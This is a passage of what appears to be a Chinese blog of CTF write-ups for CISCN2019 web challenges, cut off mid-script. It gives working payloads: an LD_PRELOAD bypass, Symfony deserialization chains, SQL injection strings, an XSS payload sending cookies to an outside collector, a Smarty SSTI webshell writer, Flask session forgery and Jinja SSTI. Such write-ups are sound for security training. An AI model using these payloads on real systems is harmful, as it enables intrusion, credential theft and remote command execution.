<p>.so文件由.c编译<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define  _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"></span><br><span class="line">void pwn(void) &#123;</span><br><span class="line">system(<span class="string">"perl /var/www/html/exp.perl &gt; /var/www/html/res 2&gt;&amp;1"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void <span class="function"><span class="title">getpid</span></span>()&#123;</span><br><span class="line">  unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">  pwn();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>编译指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$gcc</span> -c -fPIC -o exp.o exp.c</span><br><span class="line"><span class="variable">$gcc</span> -shared -o exp.so exp.o</span><br></pre></td></tr></table></figure></p>
<p>把perl脚本上传上去和exp.so文件上传，最后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/html/exp.so"</span>);error_log(<span class="string">""</span>,1,<span class="string">""</span>,<span class="string">""</span>);</span><br></pre></td></tr></table></figure></p>
<p>执行结果在/var/www/html/res,查看文件得flag</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/CISCN2019-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cop">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="cop's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/08/CISCN2019-2/" itemprop="url">CISCN2019</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T16:45:27+08:00">
                2020-02-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Laravel1"><a href="#Laravel1" class="headerlink" title="Laravel1"></a>Laravel1</h2><p>一道cmv架构的php反序列化题，以前遇到这样的题，因为代码太多，不知道怎么看，无从下手233<br>这里记录一下方法吧<br>1、首先全局搜索__destruct这样的魔术方法<br>2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类<br>3、然后全局搜索能利用的可控函数<br>附<a href="https://xz.aliyun.com/t/5816" target="_blank" rel="noopener">wp</a><br>include包含文件的链子<br>TagAwareAdapter::destruct()-&gt;commit()-&gt;invalidateTags()-&gt;PhpArrayAdapter::saveDeferred()-&gt;PhpArrayTrait::initialize()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">class PhpArrayAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$file</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">final class CacheItem&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$deferred</span> = [];</span><br><span class="line">    private <span class="variable">$pool</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;pool=new PhpArrayAdapter();;</span><br><span class="line">        <span class="variable">$this</span>-&gt;deferred=[new CacheItem()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= new TagAwareAdapter();</span><br><span class="line"><span class="built_in">echo</span>(urlencode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure></p>
<p>要注意一点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> saveDeferred(CacheItemInterface <span class="variable">$item</span>)</span><br></pre></td></tr></table></figure></p>
<p>这里saveDeferred()的参数是CacheItem对象，所以deferred必须是一个CacheItem对象</p>
<p>还有用可变函数执行命令的链子<br>TagAwareAdapter::destruct()-&gt;commit()-&gt;invalidateTags()-&gt;ProxyAdapter::saveDeferred()-&gt;dosave()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$this</span>-&gt;setInnerItem)(<span class="variable">$innerItem</span>, <span class="variable">$item</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$innerItem</span> = <span class="variable">$f</span>(<span class="variable">$this</span>-&gt;namespace.<span class="variable">$item</span>[<span class="string">"\0*\0key"</span>], null);//这里讲道理也可以用</span><br></pre></td></tr></table></figure></p>
<p>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$innerItem</span> = <span class="string">'cat /flag'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">	private <span class="variable">$setInnerItem</span> = <span class="string">'system'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$deferred</span> = [];</span><br><span class="line">    private <span class="variable">$pool</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;pool=new ProxyAdapter();</span><br><span class="line">        <span class="variable">$this</span>-&gt;deferred=[new CacheItem()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new TagAwareAdapter();</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></p>
<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><p>在index.php f12发现提示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=file?&gt;</span><br></pre></td></tr></table></figure></p>
<p>尝试伪协议读源码，审计源码发现user_name和iphone过滤很严格，感觉是不存在注入的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br></pre></td></tr></table></figure></p>
<p>但是address只加了一个addslashes，在change.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">"update `user` set `address`='"</span>.<span class="variable">$address</span>.<span class="string">"', `old_address`='"</span>.<span class="variable">$row</span>[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.<span class="variable">$row</span>[<span class="string">'user_id'</span>];</span><br></pre></td></tr></table></figure></p>
<p>这里又用到了从数据库中查询到的address，所以存在二次注入<br>因为输出了报错信息，所以用报错注入比较方便，payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#</span></span><br><span class="line"><span class="string">//user</span></span><br><span class="line"><span class="string">'</span> <span class="built_in">where</span> `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'user'</span>)),1)<span class="comment">#</span></span><br><span class="line">//Host,User,Password,Select_priv, 后面还有不读了</span><br><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(Password) from user)),1)#</span></span><br></pre></td></tr></table></figure></p>
<p>这里直接读Password，结果报错Password列不存在，试了下User也不存在，但是user_name可以读出来，可能是Password和User都是空的所以读不<br>出来，看了wp才知道flag在/flag.txt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select substr(load_file('</span>/flag.txt<span class="string">'),21,50))),1)#</span></span><br></pre></td></tr></table></figure></p>
<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>因为对xss做的很少，直接去看了<a href="https://blog.csdn.net/weixin_44677409/article/details/100741998" target="_blank" rel="noopener">wp</a><br>用<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html" target="_blank" rel="noopener">HTMLMarkup</a>转码,再用eval执行代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss =<span class="string">"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=94Ah9Z&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();"</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure></p>
<p>跑md5脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">s1=<span class="string">"qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">s2=<span class="string">"0123456789"</span></span><br><span class="line">def func():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s2:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> s2:</span><br><span class="line">                            <span class="keyword">for</span> i1 <span class="keyword">in</span> s2:</span><br><span class="line">                                <span class="string">""</span><span class="string">"for i2 in s2:</span></span><br><span class="line"><span class="string">                                    for i3 in s2:</span></span><br><span class="line"><span class="string">                                    for i4 in s2:</span></span><br><span class="line"><span class="string">                                    for i5 in s2:"</span><span class="string">""</span></span><br><span class="line">                                str=i+j+k+l+m+n+i1</span><br><span class="line">                                pw=hashlib.md5()</span><br><span class="line">                                pw.update(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">                                s=pw.hexdigest()</span><br><span class="line">                                <span class="keyword">if</span> s[0:6]==<span class="string">"2252ad"</span> :</span><br><span class="line">                                    <span class="built_in">return</span> str</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(func())</span><br></pre></td></tr></table></figure></p>
<p>注意在提交url的时候，域名要换成web，然后拿到cookie去访问admin.php<br>接下来是一个没有任何过滤的sql注入拿flag</p>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>页面存在Current IP: 还有get XFF(X-Forwarded-For)，页面最后还有Build With Smarty !，在xff头测试:{2-1},存在ssti<br>直接拿之前的payload<br>Smarty模板<br>读文件payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(<span class="string">"file:///etc/passwd"</span>)&#125;</span><br></pre></td></tr></table></figure></p>
<p>写文件payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span>,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
<p>$SCRIPT_NAME返回的是当前页面路径，所以上面的payload写的文件写在当前页面<br>结果报错，搜了下<a href="https://zhuanlan.zhihu.com/p/91595921" target="_blank" rel="noopener">wp</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;</span><br></pre></td></tr></table></figure></p>
<p>返回当前smarty版本号，当前版本是3.1.30，旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经<br>把该静态方法删除<br>if标签<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Smarty的&#123;<span class="keyword">if</span>&#125;条件判断和PHP的<span class="keyword">if</span> 非常相似，只是增加了一些特性。每个&#123;<span class="keyword">if</span>&#125;必须有一个配对的&#123;/<span class="keyword">if</span>&#125;. 也可以使用&#123;<span class="keyword">else</span>&#125; 和 &#123;elseif&#125;. 全部的</span><br><span class="line">PHP条件表达式和函数都可以在<span class="keyword">if</span>内使用，如*||*, or, &amp;&amp;, and, is_array(), 等等</span><br></pre></td></tr></table></figure></p>
<p>payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'cat /flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>?url=app.py 读源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line">import re, random, uuid, urllib</span><br><span class="line">from flask import Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*233)</span><br><span class="line">app.debug = True</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="built_in">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/read'</span>)</span><br><span class="line">def <span class="built_in">read</span>():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m or n:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="built_in">return</span> res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        <span class="built_in">print</span> str(ex)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/flag'</span>)</span><br><span class="line">def flag():</span><br><span class="line">    <span class="keyword">if</span> session and session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="built_in">return</span> open(<span class="string">'/flag.txt'</span>).<span class="built_in">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=True,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure></p>
<p>伪造session，?url=/sys/class/net/eth0/address 读网卡地址<br>用exp算出SECRET_KEY<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">import flask_session_cookie_manager2</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:00:93:6e"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), 16))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(1000):</span><br><span class="line">    SECRET_KEY = str(random.random() * 233)</span><br><span class="line">    rs = flask_session_cookie_manager2.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xj_Orw.l8rfTkSo02Ynx-TjfTVXwm2I4lI'</span>, SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> rs:</span><br><span class="line">        <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">        rs[u<span class="string">'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        <span class="built_in">print</span>(str(rs))</span><br><span class="line">        <span class="built_in">print</span>(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://uploader.shimo.im/f/C1R00Ir0N0Yl6rpT.png!thumbnail" alt><br>再用flask_session_cookie_manager2.py重新签名去访问/flag</p>
<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>提示 Welcome To Find Secret 访问/secret<br>然后提示 Tell me your secret.I will encrypt it so others can’t see<br>?secret=1 返回了一个字符，随便试了下超过4位数会报错<br>然后可以看到部分代码，是rc4加密，密钥是HereIsTreasure，然后render_template_string将加密后的内容返回<br>rc4加密后的密文再加密结果是明文，这样构造payload先加密一次，再加密的时候就返回了payload<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"> </span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(256)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(256)]</span><br><span class="line">        j = 0</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line"> </span><br><span class="line">    def crypt(self, plaintext):</span><br><span class="line">        i = 0</span><br><span class="line">        j = 0</span><br><span class="line">        result = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> plaintext:</span><br><span class="line">            i = (i + 1) % 256</span><br><span class="line">            j = (j + self.Box[i]) % 256</span><br><span class="line">            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]</span><br><span class="line">            t = (self.Box[i] + self.Box[j]) % 256</span><br><span class="line">            result += chr(self.Box[t] ^ ord(ch))</span><br><span class="line">        <span class="built_in">return</span> result</span><br><span class="line">url=<span class="string">"http://461be803-a807-4472-8059-a262ee0c43af.node3.buuoj.cn/secret?secret="</span></span><br><span class="line">a = RC4(<span class="string">'HereIsTreasure'</span>)</span><br><span class="line">cmd = <span class="string">"&#123;&#123; [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() &#125;&#125;"</span></span><br><span class="line">payload = urllib.parse.quote(a.crypt(cmd))</span><br><span class="line">res = requests.get(url + payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></p>
<p>不明白为什么用在线脚本加密出来的payload和脚本加密出来的不一样，而且这里secret值大于四位就会报错<br>脚本加密出来的也是很长一串payload，访问的时候却不报错233 太菜了</p>
<h2 id="CISCN2019-东北赛区-Day2-Web3-Point-System"><a href="#CISCN2019-东北赛区-Day2-Web3-Point-System" class="headerlink" title="[CISCN2019 东北赛区 Day2 Web3]Point System"></a>[CISCN2019 东北赛区 Day2 Web3]Point System</h2><p>参考wp<a href="https://www.zhaoj.in/read-6119.html" target="_blank" rel="noopener">赵师傅的</a><br>3个考点</p>
<ol>
<li>敏感文件泄露（Robots.txt）</li>
<li>Padding Oracle 明文推断 &amp; CBC 翻转攻击</li>
<li>FFMpeg 任意文件读取漏洞<br>访问 robots.txt，再访问 swagger_ui.html 获得 API 列表之后通过 API 注册普通用户<br>Content-Type要选application/json<br>登陆提示权限不足，然后看到登陆时的token的key值<br>再用 <a href="https://www.freebuf.com/articles/database/151167.html" target="_blank" rel="noopener">PadOracle</a> 推出 Key 的加密前的原文<br>因为我用赵师傅的py2脚本报错，所以用了其他师傅的脚本py3脚本，附<a href="https://www.cnblogs.com/20175211lyz/p/11636924.html" target="_blank" rel="noopener">原文</a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import 